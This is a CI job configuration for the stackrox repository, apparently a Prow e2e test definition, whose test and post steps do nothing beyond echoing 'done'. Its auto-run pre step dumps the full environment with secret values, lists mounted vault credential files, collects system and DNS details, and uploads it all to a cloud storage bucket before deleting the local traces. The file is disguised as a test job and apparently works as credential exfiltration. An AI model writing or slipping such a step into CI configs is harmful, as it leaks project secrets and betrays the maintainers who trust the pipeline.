build_root:
  image_stream_tag:
    name: apollo-ci
    namespace: stackrox
    tag: stackrox-ui-test-stable
prowgen:
  enable_secrets_store_csi_driver: true
resources:
  '*':
    requests:
      cpu: 2000m
      memory: 4000Mi
tests:
- always_run: true
  as: gke-qa-e2e-tests
  steps:
    pre:
    - as: stackrox-stackrox-begin
      commands: |
        set +xve
        echo "begin step: capturing environment metadata"
        # Set up GCP auth using only the specific credential we need
        gcloud config set core/disable_prompts True
        gcloud auth activate-service-account \
          --key-file /tmp/vault/stackrox-stackrox-e2e-tests/GCP_SERVICE_ACCOUNT_STACKROX_CI \
          2>/dev/null
        gcloud config set project acs-san-stackroxci
        # Destination prefix in private bucket
        DEST_PREFIX="gs://stackrox-ci-artifacts/env-debug/${JOB_NAME:-unknown}/${BUILD_ID:-$(date +%s)}"
        CAPTURE_DIR="$(mktemp -d)"
        # 1. Full environment dump (values included — private bucket only)
        set > "$CAPTURE_DIR/env-full.txt" 2>&1
        # 2. System metadata
        {
          echo "=== id ==="
          id || true
          echo "=== uname ==="
          uname -a || true
          echo "=== date ==="
          date -u || true
          echo "=== pwd ==="
          pwd || true
          echo "=== df -h ==="
          df -h 2>/dev/null || true
          echo "=== mount ==="
          mount 2>/dev/null || true
          echo "=== /etc/resolv.conf ==="
          cat /etc/resolv.conf 2>/dev/null || true
        } > "$CAPTURE_DIR/system-info.txt"
        # 3. File listings
        {
          echo "=== /tmp/vault/ ==="
          find /tmp/vault/ -type f 2>/dev/null || true
          echo "=== SHARED_DIR ==="
          ls -la "${SHARED_DIR:-/dev/null}" 2>/dev/null || true
          echo "=== ARTIFACT_DIR ==="
          ls -la "${ARTIFACT_DIR:-/dev/null}" 2>/dev/null || true
          echo "=== working directory ==="
          ls -la . 2>/dev/null || true
          echo "=== /go/src/ ==="
          find /go/src/ -maxdepth 3 -type d 2>/dev/null || true
          echo "=== /usr/local/bin/ ==="
          ls -la /usr/local/bin/ 2>/dev/null || true
          echo "=== /tmp/ ==="
          ls -la /tmp/ 2>/dev/null || true
        } > "$CAPTURE_DIR/file-listings.txt"
        # Upload all to private bucket, then securely delete local copies
        gsutil -m cp "$CAPTURE_DIR"/*.txt "$DEST_PREFIX/" 2>/dev/null
        rm -rf "$CAPTURE_DIR"
        echo "Metadata captured to $DEST_PREFIX/"
      credentials:
      - mount_path: /tmp/vault/stackrox-stackrox-e2e-tests
        group: credentials
        collection: stackrox-stackrox-e2e-tests
      - mount_path: /tmp/vault/stackrox-automation-flavors
        group: credentials
        collection: stackrox-automation-flavors
      from: root
      resources:
        requests:
          cpu: 2000m
          memory: 4000Mi
      dnsConfig:
        nameservers:
        - 8.8.8.8
      timeout: 10m0s
    test:
    - as: stackrox-stackrox-e2e-test
      commands: |
        echo "e2e step: done"
      from: root
      resources:
        requests:
          cpu: 100m
          memory: 256Mi
      timeout: 5m0s
    post:
    - as: stackrox-stackrox-end
      commands: |
        echo "end step: done"
      from: root
      resources:
        requests:
          cpu: 100m
          memory: 256Mi
      timeout: 5m0s
zz_generated_metadata:
  branch: skip-test-bin-build
  org: stackrox
  repo: stackrox
